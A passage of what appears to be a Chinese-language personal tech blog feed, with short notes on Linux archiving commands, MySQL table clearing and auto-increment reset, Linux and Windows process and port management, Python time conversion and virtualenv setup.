        <content type="html"><![CDATA[<h3 id="一、-gzip-gunzip"><a href="#一、-gzip-gunzip" class="headerlink" title="一、 gzip&#x2F;gunzip"></a>一、 gzip&#x2F;gunzip</h3><h4 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h4><ol><li>只能压缩文件不能压缩目录</li><li>不保留原来的文件</li><li>同时压缩多个文件会产生多个压缩包</li></ol><h4 id="2-操作"><a href="#2-操作" class="headerlink" title="2.操作"></a>2.操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩</span></span><br><span class="line">gzip test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">gunzip test.txt.gz</span><br></pre></td></tr></table></figure><h3 id="二、zip-unzip"><a href="#二、zip-unzip" class="headerlink" title="二、zip&#x2F;unzip"></a>二、zip&#x2F;unzip</h3><h4 id="1-特点-1"><a href="#1-特点-1" class="headerlink" title="1.特点"></a>1.特点</h4><ol><li>压缩命令在Windows&#x2F;Linux都通用</li><li>可以压缩目录且保留源文件</li></ol><h4 id="2-操作-1"><a href="#2-操作-1" class="headerlink" title="2.操作"></a>2.操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩</span></span><br><span class="line">zip test.zip test1.txt test2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">unzip test.zip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压到指定目录</span></span><br><span class="line">unzip test.zip -d /home</span><br></pre></td></tr></table></figure><h3 id="三、tar"><a href="#三、tar" class="headerlink" title="三、tar"></a>三、tar</h3><h4 id="1-选项"><a href="#1-选项" class="headerlink" title="1.选项"></a>1.选项</h4><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-c</td><td>产生.tar打包文件</td></tr><tr><td>-v</td><td>显示详细信息</td></tr><tr><td>-f</td><td>指定压缩后的文件名</td></tr><tr><td>-z</td><td>打包同时压缩</td></tr><tr><td>-x</td><td>解包.tar文件</td></tr><tr><td>-C</td><td>解压到指定目录</td></tr></tbody></table><h4 id="2-操作-2"><a href="#2-操作-2" class="headerlink" title="2.操作"></a>2.操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩文件</span></span><br><span class="line">tar -zcvf test.tar.gz test1.txt test2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩目录</span></span><br><span class="line">tar -zcvf test.tar.gz test/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf test.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压到指定目录</span></span><br><span class="line">tar -zxvf test.tar.gz -C /home</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No118：MySQL清空表的各种方法</title>
      <link href="/posts/13e04199.html"/>
      <url>/posts/13e04199.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、MySQL清空表数据命令：truncate"><a href="#1、MySQL清空表数据命令：truncate" class="headerlink" title="1、MySQL清空表数据命令：truncate"></a>1、MySQL清空表数据命令：truncate</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truncate table 表名</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>不能与where一起使用。</li><li>truncate删除数据后是不可以rollback的。</li><li>truncate删除数据后会重置Identity（标识列、自增字段），相当于自增列会被置为初始值，又重新从1开始记录，而不是接着原来的ID数。</li><li>truncate删除数据后不写服务器log，整体删除速度快。</li><li>truncate删除数据后不激活trigger(触发器)。</li></ul><h3 id="2、MySQL删除表命令：drop"><a href="#2、MySQL删除表命令：drop" class="headerlink" title="2、MySQL删除表命令：drop"></a>2、MySQL删除表命令：drop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">drop table 表名;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者是</span></span><br><span class="line">drop table if exists 表名;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>truncate只会清除表数据，drop不光清除表数据还要删除表结构。</li></ul><h3 id="3、MySQL清空数据表指定内容的语法：delete"><a href="#3、MySQL清空数据表指定内容的语法：delete" class="headerlink" title="3、MySQL清空数据表指定内容的语法：delete"></a>3、MySQL清空数据表指定内容的语法：delete</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">delete from 表名 where id=&#x27;1&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者是</span></span><br><span class="line">delete from 表名;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>delete含义：你要删除哪张表的数据?你要删掉哪些行?</li><li>delete可以删除一行，也可以删除多行；</li><li>如果不加where条件，则是删除表所有的数据，这是很危险的！不建议这样做！</li></ul><h3 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h3><ul><li>当你不再需要该表时，用drop;</li><li>当你仍要保留该表，但要删除所有数据表记录时，用truncate;</li><li>当你要删除部分记录或者有可能会后悔的话，用delete。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No117：MySQL自增ID归1</title>
      <link href="/posts/b470718c.html"/>
      <url>/posts/b470718c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>自增ID不满足需求时可以改变。</p></blockquote><h3 id="1、清空所有数据，自增字段恢复从1开始计数"><a href="#1、清空所有数据，自增字段恢复从1开始计数" class="headerlink" title="1、清空所有数据，自增字段恢复从1开始计数"></a>1、清空所有数据，自增字段恢复从1开始计数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truncate table 表名;</span><br></pre></td></tr></table></figure><h3 id="2、自增字段恢复从1开始计数"><a href="#2、自增字段恢复从1开始计数" class="headerlink" title="2、自增字段恢复从1开始计数"></a>2、自增字段恢复从1开始计数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alter table 表名 AUTO_INCREMENT=1;</span><br></pre></td></tr></table></figure><h3 id="3、清空具有外键约束的表时报ERROR-1701-42000-的解决方法"><a href="#3、清空具有外键约束的表时报ERROR-1701-42000-的解决方法" class="headerlink" title="3、清空具有外键约束的表时报ERROR 1701(42000)的解决方法"></a>3、清空具有外键约束的表时报ERROR 1701(42000)的解决方法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭外键约束</span></span><br><span class="line">SET foreign_key_checks=0;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启外键约束</span></span><br><span class="line">SET foreign_key_checks=1;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No116：Linux的进程、端口相关操作</title>
      <link href="/posts/771cafc0.html"/>
      <url>/posts/771cafc0.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、进程"><a href="#一、进程" class="headerlink" title="一、进程"></a>一、进程</h3><h4 id="1、进程查询"><a href="#1、进程查询" class="headerlink" title="1、进程查询"></a>1、进程查询</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br><span class="line">ps -aux | grep python</span><br></pre></td></tr></table></figure><p>ps命令用于报告当前系统的进程状态。</p><p>a：显示当前终端下的所有进程信息，包括其他用户的进程。</p><p>u：使用以用户为主的格式输出进程信息。</p><p>x：显示当前用户在所有终端下的进程。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -elf</span><br><span class="line">ps -elf | grep python</span><br></pre></td></tr></table></figure><p>ps命令用于报告当前系统的进程状态。</p><p>-e：显示系统内的所有进程信息。</p><p>-l：使用长（long）格式显示进程信息。</p><p>-f：使用完整的（full）格式显示进程信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pstree -aup</span><br><span class="line">pstree -aup | grep python</span><br></pre></td></tr></table></figure><p>以树状图的方式展现进程之间的派生关系，显示效果比较直观。</p><p>-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；</p><p>-c：不使用精简标示法；</p><p>-G：使用VT100终端机的列绘图字符；</p><p>-h：列出树状图时，特别标明现在执行的程序；</p><p>-H&lt;程序识别码&gt;：此参数的效果和指定”-h”参数类似，但特别标明指定的程序；</p><p>-l：采用长列格式显示树状图；</p><p>-n：用程序识别码排序。预设是以程序名称来排序；</p><p>-p：显示程序识别码；</p><p>-u：显示用户名称；</p><h4 id="2、进程终止"><a href="#2、进程终止" class="headerlink" title="2、进程终止"></a>2、进程终止</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终止指定进程</span></span><br><span class="line">kill -9 进程号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找python进程并终止</span></span><br><span class="line">ps -ef | grep python | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询并终止python相关进程</span></span><br><span class="line">pgrep python | xargs kill -s 9</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终止所有名称匹配的进程</span></span><br><span class="line">killall -9 完整进程名</span><br></pre></td></tr></table></figure><h3 id="二、端口"><a href="#二、端口" class="headerlink" title="二、端口"></a>二、端口</h3><h4 id="1、端口查询"><a href="#1、端口查询" class="headerlink" title="1、端口查询"></a>1、端口查询</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof -i:端口号</span><br></pre></td></tr></table></figure><p>lsof(list open files)是一个列出当前系统打开文件的工具。</p><p>lsof -i:8080：查看8080端口占用</p><p>lsof abc.txt：显示开启文件abc.txt的进程</p><p>lsof -c abc：显示abc进程现在打开的文件</p><p>lsof -c -p 1234：列出进程号为1234的进程所打开的文件</p><p>lsof -g gid：显示归属gid的进程情况</p><p>lsof +d &#x2F;usr&#x2F;local&#x2F;：显示目录下被进程开启的文件</p><p>lsof +D &#x2F;usr&#x2F;local&#x2F;：同上，但是会搜索目录下的目录，时间较长</p><p>lsof -d 4：显示使用fd为4的进程</p><p>lsof -i -U：显示所有打开的端口和UNIX domain文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tunlp | grep 端口号</span><br></pre></td></tr></table></figure><p>netstat -tunlp用于显示tcp，udp的端口和进程等相关情况。</p><p>-t：(tcp)仅显示tcp相关选项</p><p>-u：(udp)仅显示udp相关选项</p><p>-n：拒绝显示别名，能显示数字的全部转化为数字</p><p>-l：仅列出在Listen(监听)的服务状态</p><p>-p：显示建立相关链接的程序名</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No115：Windows的进程、端口相关操作</title>
      <link href="/posts/680e3db1.html"/>
      <url>/posts/680e3db1.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、端口-进程"><a href="#一、端口-进程" class="headerlink" title="一、端口-&gt;进程"></a>一、端口-&gt;进程</h3><p>1、格式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看占用端口号的进程ID</span></span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;</span><br></pre></td></tr></table></figure><p>2、详解</p><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>-a</td><td>显示所有连接和侦听端口。</td></tr><tr><td>-b</td><td>显示在创建每个连接或侦听端口时涉及的可执行程序。</td></tr><tr><td>-e</td><td>显示以太网统计。此选项可以与 -s 选项结合使用。</td></tr><tr><td>-f</td><td>显示外部地址的完全限定域名(FQDN)。</td></tr><tr><td>-n</td><td>以数字形式显示地址和端口号。</td></tr><tr><td>-o</td><td>显示拥有的与每个连接关联的进程 ID。</td></tr><tr><td>-p proto</td><td>显示 proto 指定的协议的连接。</td></tr><tr><td>-r</td><td>显示路由表。</td></tr><tr><td>-s</td><td>显示每个协议的统计。</td></tr><tr><td>-t</td><td>显示当前连接卸载状态。</td></tr><tr><td>interval</td><td>重新显示选定的统计，各个显示间暂停的间隔秒数。</td></tr><tr><td>&#x2F;?</td><td>在命令提示符下显示帮助。</td></tr></tbody></table><h3 id="二、进程-程序"><a href="#二、进程-程序" class="headerlink" title="二、进程-&gt;程序"></a>二、进程-&gt;程序</h3><p>1、格式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看运行进程的程序名称</span></span><br><span class="line">tasklist | findstr &quot;进程ID&quot;</span><br></pre></td></tr></table></figure><p>2、详解</p><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>&#x2F;S ystem</td><td>指定连接到的远程系统。</td></tr><tr><td>&#x2F;U user</td><td>指定应该在哪个用户上下文执行这个命令。</td></tr><tr><td>&#x2F;P password</td><td>为提供的用户上下文指定密码。如果省略，则提示输入。</td></tr><tr><td>&#x2F;M module</td><td>列出当前使用所给 exe&#x2F;dll 名称的所有任务。如果没有指定模块名称，显示所有加载的模块。</td></tr><tr><td>&#x2F;SVC</td><td>显示每个进程中主持的服务。</td></tr><tr><td>&#x2F;V</td><td>显示详述任务信息。</td></tr><tr><td>&#x2F;FI filter</td><td>显示一系列符合筛选器指定的标准的任务。</td></tr><tr><td>&#x2F;FO format</td><td>指定输出格式。有效值: “TABLE”、“LIST”、“CSV”。</td></tr><tr><td>&#x2F;NH</td><td>指定列标题不应该在输出中显示。只对 “TABLE” 和 “CSV” 格式有效。</td></tr><tr><td>&#x2F;?</td><td>显示帮助消息。</td></tr></tbody></table><h3 id="三、kill-进程、程序"><a href="#三、kill-进程、程序" class="headerlink" title="三、kill-&gt;进程、程序"></a>三、kill-&gt;进程、程序</h3><p>1、格式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终止进程</span></span><br><span class="line">taskkill /f /t /pid &quot;进程ID&quot;</span><br><span class="line">taskkill /f /t /im &quot;程序名称&quot;</span><br></pre></td></tr></table></figure><p>2、详解</p><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>&#x2F;S system</td><td>指定要连接的远程系统。</td></tr><tr><td>&#x2F;U user</td><td>指定应该在哪个用户上下文执行这个命令。</td></tr><tr><td>&#x2F;P password</td><td>为提供的用户上下文指定密码。如果忽略，提示输入。</td></tr><tr><td>&#x2F;FI filter</td><td>应用筛选器以选择一组任务。允许使用 “*”</td></tr><tr><td>&#x2F;PID processid</td><td>指定要终止的进程的 PID。使用 TaskList 取得 PID。</td></tr><tr><td>&#x2F;IM imagename</td><td>指定要终止的进程的映像名称。通配符 ‘*’可用来指定所有任务或映像名称。</td></tr><tr><td>&#x2F;T</td><td>终止指定的进程和由它启用的子进程。</td></tr><tr><td>&#x2F;F</td><td>指定强制终止进程。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No114：Python的时间转换相关操作</title>
      <link href="/posts/9b1525ab.html"/>
      <url>/posts/9b1525ab.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、str类型时间-时间数组"><a href="#1、str类型时间-时间数组" class="headerlink" title="1、str类型时间-时间数组"></a>1、str类型时间-时间数组</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符类型的时间</span></span><br><span class="line">ttime_str = <span class="string">&quot;2020-01-01 11:22:33&quot;</span></span><br><span class="line"><span class="comment"># 转为时间数组</span></span><br><span class="line">timeArray = time.strptime(ttime_str, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(timeArray)</span><br><span class="line"><span class="comment"># 年</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_year)</span><br><span class="line"><span class="comment"># 月(1-12)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_mon)</span><br><span class="line"><span class="comment"># 日(1-31)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_mday)</span><br><span class="line"><span class="comment"># 时(0-23)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_hour)</span><br><span class="line"><span class="comment"># 分(0-59)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_min)</span><br><span class="line"><span class="comment"># 秒(0-61,60或61是闰秒)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_sec)</span><br><span class="line"><span class="comment"># 周几(0到6,0是周一)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_wday)</span><br><span class="line"><span class="comment"># 一年中的第几天(1-366)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_yday)</span><br><span class="line"><span class="comment"># 是否为夏令时(1/夏令时,0/不是夏令时,-1/未知,默认-1)</span></span><br><span class="line"><span class="built_in">print</span>(timeArray.tm_isdst)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、str类型时间-显示格式"><a href="#2、str类型时间-显示格式" class="headerlink" title="2、str类型时间-显示格式"></a>2、str类型时间-显示格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符类型的时间</span></span><br><span class="line">time_str = <span class="string">&quot;2020-01-01 11:22:33&quot;</span></span><br><span class="line"><span class="comment"># 转为时间数组</span></span><br><span class="line">timeArray = time.strptime(time_str, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment"># 转为指定显示格式</span></span><br><span class="line">otherStyleTime = time.strftime(<span class="string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>, timeArray)</span><br><span class="line"><span class="built_in">print</span>(otherStyleTime)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、str类型时间-时间戳"><a href="#3、str类型时间-时间戳" class="headerlink" title="3、str类型时间-时间戳"></a>3、str类型时间-时间戳</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符类型的时间</span></span><br><span class="line">ttime_str = <span class="string">&quot;2020-01-01 11:22:33&quot;</span></span><br><span class="line"><span class="comment"># 转为时间数组</span></span><br><span class="line">timeArray = time.strptime(ttime_str, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(timeArray)</span><br><span class="line"><span class="comment"># 转为时间戳</span></span><br><span class="line">timeStamp = <span class="built_in">int</span>(time.mktime(timeArray))</span><br><span class="line"><span class="built_in">print</span>(timeStamp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用time</span></span><br><span class="line">timeStamp = <span class="number">1577848953</span></span><br><span class="line"><span class="comment"># 转为时间数组</span></span><br><span class="line">timeArray = time.localtime(timeStamp)</span><br><span class="line"><span class="built_in">print</span>(timeArray)</span><br><span class="line"><span class="comment"># 转为指定显示格式</span></span><br><span class="line">otherStyleTime = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, timeArray)</span><br><span class="line"><span class="built_in">print</span>(otherStyleTime)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用datetime</span></span><br><span class="line">timeStamp = <span class="number">1577848953</span></span><br><span class="line"><span class="comment"># 转为datetime.datetime</span></span><br><span class="line">dateArray = datetime.fromtimestamp(timeStamp)</span><br><span class="line"><span class="built_in">print</span>(dateArray)</span><br><span class="line"><span class="comment"># 转为指定显示格式</span></span><br><span class="line">otherStyleTime = dateArray.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(otherStyleTime)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用datetime，指定utc时间，相差8小时</span></span><br><span class="line">timeStamp = <span class="number">1577848953</span></span><br><span class="line"><span class="comment"># 转为datetime.datetime</span></span><br><span class="line">dateArray = datetime.utcfromtimestamp(timeStamp)</span><br><span class="line"><span class="built_in">print</span>(dateArray)</span><br><span class="line"><span class="comment"># 转为指定显示格式</span></span><br><span class="line">otherStyleTime = dateArray.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(otherStyleTime)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、获取当前时间"><a href="#4、获取当前时间" class="headerlink" title="4、获取当前时间"></a>4、获取当前时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># datetime获取当前时间，数组格式</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(now)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间戳</span></span><br><span class="line">timeStamp = time.time()</span><br><span class="line"><span class="built_in">print</span>(timeStamp)</span><br><span class="line"><span class="comment"># 秒</span></span><br><span class="line">timeStamp_s = <span class="built_in">int</span>(timeStamp)</span><br><span class="line"><span class="built_in">print</span>(timeStamp_s)</span><br><span class="line"><span class="comment"># 毫秒</span></span><br><span class="line">timeStamp_ms = <span class="built_in">int</span>(timeStamp * <span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(timeStamp_ms)</span><br><span class="line"><span class="comment"># 微妙</span></span><br><span class="line">timeStamp_us = <span class="built_in">int</span>(timeStamp * <span class="number">1000000</span>)</span><br><span class="line"><span class="built_in">print</span>(timeStamp_us)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No113：Python虚拟环境-Ubuntu16.04</title>
      <link href="/posts/f89f278d.html"/>
      <url>/posts/f89f278d.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、系统环境"><a href="#1、系统环境" class="headerlink" title="1、系统环境"></a>1、系统环境</h3><p>Ubuntu16.04</p><h3 id="2、安装虚拟环境"><a href="#2、安装虚拟环境" class="headerlink" title="2、安装虚拟环境"></a>2、安装虚拟环境</h3><ul><li>升级pip3</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure><ul><li>安装虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv</span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>virtualenvwrapper是virtualenv的扩展管理包，可以将所有的虚拟环境整合在一个目录下。</p><h3 id="3、配置虚拟环境"><a href="#3、配置虚拟环境" class="headerlink" title="3、配置虚拟环境"></a>3、配置虚拟环境</h3><ul><li>创建虚拟环境管理目录</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/.envs</span><br></pre></td></tr></table></figure><ul><li>打开.bashrc</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>在.bashrc的末尾增加下面内容</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=/usr/local/python3/bin/virtualenv</span></span><br><span class="line">export WORKON_HOME=$HOME/.envs</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><ul><li>使配置生效</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="4、虚拟环境操作"><a href="#4、虚拟环境操作" class="headerlink" title="4、虚拟环境操作"></a>4、虚拟环境操作</h3><ul><li>创建虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv env_name</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">env_name为你要创建的虚拟环境的名字，需要联网</span></span><br></pre></td></tr></table></figure><ul><li>创建指定python版本的虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv -p /usr/bin/python3 spider_py38</span><br><span class="line">mkvirtualenv -p /usr/bin/python2 spider_py27</span><br></pre></td></tr></table></figure><ul><li>查看安装的所有虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure><ul><li>进入虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon env_nam</span><br></pre></td></tr></table></figure><ul><li>退出虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><ul><li>删除虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rmvirtualenv env_nam</span><br></pre></td></tr></table></figure><h3 id="5、virtualenv的使用"><a href="#5、virtualenv的使用" class="headerlink" title="5、virtualenv的使用"></a>5、virtualenv的使用</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试安装</span></span><br><span class="line">virtualenv --version</span><br></pre></td></tr></table></figure><ul><li>创建虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定python版本的虚拟环境</span></span><br><span class="line">mkvirtualenv -p /usr/bin/python3 spider_py38</span><br></pre></td></tr></table></figure><ul><li>激活虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source spider_py38/bin/activate</span><br></pre></td></tr></table></figure><ul><li>关闭虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No112：Python虚拟环境-Centos7</title>
      <link href="/posts/3a8171b5.html"/>
      <url>/posts/3a8171b5.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、系统环境"><a href="#1、系统环境" class="headerlink" title="1、系统环境"></a>1、系统环境</h3><p>Centos7</p><h3 id="2、安装虚拟环境"><a href="#2、安装虚拟环境" class="headerlink" title="2、安装虚拟环境"></a>2、安装虚拟环境</h3><ul><li>升级pip3</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure><ul><li>安装虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv</span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>virtualenvwrapper是virtualenv的扩展管理包，可以将所有的虚拟环境整合在一个目录下。</p><h3 id="3、配置虚拟环境"><a href="#3、配置虚拟环境" class="headerlink" title="3、配置虚拟环境"></a>3、配置虚拟环境</h3><ul><li>创建虚拟环境管理目录</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/.envs</span><br></pre></td></tr></table></figure><ul><li>打开.bashrc</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>在.bashrc的末尾增加下面内容</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export VIRTUALENVWRAPPER_PYTHON=/usr/local/python38/bin/python3</span><br><span class="line">export VIRTUALENVWRAPPER_VIRTUALENV=/usr/local/python38/bin/virtualenv</span><br><span class="line">export WORKON_HOME=$HOME/.envs</span><br><span class="line">source /usr/local/python38/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><ul><li>使配置生效</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="4、虚拟环境操作"><a href="#4、虚拟环境操作" class="headerlink" title="4、虚拟环境操作"></a>4、虚拟环境操作</h3><ul><li>创建虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv env_name</span><br><span class="line"><span class="meta prompt_"># </span><span 